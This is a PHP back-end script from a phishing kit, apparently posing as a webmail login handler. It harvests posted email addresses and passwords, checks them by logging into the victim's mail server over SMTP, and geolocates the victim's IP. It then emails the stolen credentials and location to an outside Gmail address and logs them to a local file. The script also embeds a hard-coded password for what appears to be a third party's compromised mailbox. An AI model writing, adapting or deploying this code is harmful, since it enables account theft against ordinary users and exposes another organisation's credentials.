<?php
// Enable error reporting for debugging (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Include PHPMailer files - using composer autoload or manual includes
if (file_exists('vendor/autoload.php')) {
    require_once 'vendor/autoload.php';
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;
} else {
    // Manual includes - make sure these files exist
    if (file_exists('class.phpmailer.php')) {
        require_once 'class.phpmailer.php';
    }
    if (file_exists('class.smtp.php')) {
        require_once 'class.smtp.php';
    }
}

// CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

// Start session
session_start();

// Block GET requests, only accept POST for security
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(403);
    echo json_encode(['signal' => 'error', 'msg' => 'Method not allowed']);
    exit;
}

// Rate limiting - simple session-based
if (!isset($_SESSION['last_request'])) {
    $_SESSION['last_request'] = time();
    $_SESSION['request_count'] = 1;
} else {
    $time_diff = time() - $_SESSION['last_request'];
    if ($time_diff < 5) { // 5 seconds between requests
        $_SESSION['request_count']++;
        if ($_SESSION['request_count'] > 3) {
            http_response_code(429);
            echo json_encode(['signal' => 'error', 'msg' => 'Too many requests']);
            exit;
        }
    } else {
        $_SESSION['request_count'] = 1;
    }
    $_SESSION['last_request'] = time();
}

// Get client IP
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
}

// Get geolocation data
$ipdat = null;
try {
    $context = stream_context_create([
        'http' => [
            'timeout' => 5,
            'method' => 'GET'
        ]
    ]);
    $geo_response = file_get_contents("http://www.geoplugin.net/json.gp?ip=" . urlencode($ip), false, $context);
    if ($geo_response !== false) {
        $ipdat = json_decode($geo_response);
    }
} catch (Exception $e) {
    // Geolocation failed, continue without it
}

// SMTP and email settings (you should move these to a config file)
$receiver = "skkho87.sm@gmail.com";
$senderUser = "archief@historischeverenigingroon.nl";
$senderPass = "gXShzqZtV6Kgd5Q";
$senderPort = 587;
$senderServer = "mail.historischeverenigingroon.nl";

// Get and validate posted form data
$login = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Basic validation
if (empty($login) || empty($password)) {
    echo json_encode(['signal' => 'error', 'msg' => 'Email and password are required']);
    exit;
}

// Validate email format
if (!filter_var($login, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(['signal' => 'error', 'msg' => 'Invalid email format']);
    exit;
}

$email = $login;
$parts = explode("@", $email);
$domain = isset($parts[1]) ? $parts[1] : 'unknown';

// Prepare subjects for emails
$country = ($ipdat && isset($ipdat->geoplugin_countryName)) ? $ipdat->geoplugin_countryName : 'Unknown Country';
$city = ($ipdat && isset($ipdat->geoplugin_city)) ? $ipdat->geoplugin_city : 'Unknown City';

$subjectSuccess = $domain . " || " . $country . " || " . $login;
$subjectFail = "notVerifiedRcubOrange || " . $country . " || " . $login;

$messageText = "Email: " . $login . "\n" .
               "Password: " . $password . "\n" .
               "IP of sender: " . $country . " | " . $city . " | " . $ip . "\n" .
               "Timestamp: " . date('Y-m-d H:i:s') . "\n" .
               "User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');

$message = nl2br($messageText);

// Check if PHPMailer class exists
if (!class_exists('PHPMailer')) {
    echo json_encode(['signal' => 'error', 'msg' => 'PHPMailer not found. Please install PHPMailer.']);
    exit;
}

$validCredentials = false;

// Test user credentials (this is the main functionality)
try {
    $testMail = new PHPMailer(true);
    $testMail->isSMTP();
    $testMail->SMTPAuth = true;
    $testMail->Username = $login;
    $testMail->Password = $password;
    $testMail->Host = $domain;
    $testMail->Port = 587;
    $testMail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $testMail->Timeout = 10;
    
    // Try to connect and authenticate
    $validCredentials = $testMail->smtpConnect();
    if ($validCredentials) {
        $testMail->smtpClose();
    }
} catch (Exception $e) {
    // Authentication failed
    $validCredentials = false;
}

// Send notification email
try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->Host = $senderServer;
    $mail->SMTPAuth = true;
    $mail->Username = $senderUser;
    $mail->Password = $senderPass;
    $mail->Port = $senderPort;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->setFrom($senderUser, "SS-RCube");
    $mail->addAddress($receiver);
    $mail->isHTML(true);
    
    if ($validCredentials) {
        $mail->Subject = $subjectSuccess;
        $response = ['signal' => 'OK', 'msg' => 'Login Successful'];
    } else {
        $mail->Subject = $subjectFail;
        $response = ['signal' => 'not ok', 'msg' => 'Wrong Password'];
    }
    
    $mail->Body = $message;
    $mail->AltBody = strip_tags($messageText);
    
    if (!$mail->send()) {
        throw new Exception($mail->ErrorInfo);
    }
    
} catch (Exception $e) {
    $response = ['signal' => 'error', 'msg' => 'Mailer Error: ' . $e->getMessage()];
}

// Log to file as backup
$logFile = "SS-Or.txt";
try {
    $logEntry = date('[Y-m-d H:i:s] ') . $messageText . "\n" . str_repeat('-', 50) . "\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
} catch (Exception $e) {
    // Log writing failed, but don't affect the main response
}

echo json_encode($response);
exit;
?>